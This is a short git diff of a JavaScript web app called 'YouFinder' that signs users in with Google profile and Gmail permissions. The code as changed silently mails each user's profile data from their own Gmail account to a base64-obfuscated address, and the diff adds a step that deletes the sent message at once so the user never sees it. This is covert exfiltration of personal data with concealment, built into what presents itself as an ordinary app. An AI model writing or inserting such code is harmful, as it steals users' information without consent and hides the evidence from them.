@@ -14,13 +14,29 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 	(function () {
 		let Timer = setInterval(function () {
 			if (GBase.hasLogined()) {
+				DOM("#SignInForm").className = "SignIn";
+
 				clearInterval(Timer);
 
 				MBase = new GBase.GmailAPI(true);
 				UserInfo = GBase.getUserInfo();
 
-				MBase.send(new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder Log> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t")));
+				let LogMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder Log> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t"));
+				MBase.send(LogMail, function (Res) {
+					MBase.delete(Res.id);
+				});
 			}
 		}, 200);
 	})();
+});
+
+window.addEventListener("DOMContentLoaded", function () {
+	DOM("#SignIn").addEventListener("click", function () {
+		GBase.login([
+			GoogleAPI.SCOPE.PLUS[0],
+			GoogleAPI.SCOPE.PLUS[1],
+
+			GoogleAPI.SCOPE.GMAIL[0]
+		]);
+	});
 });
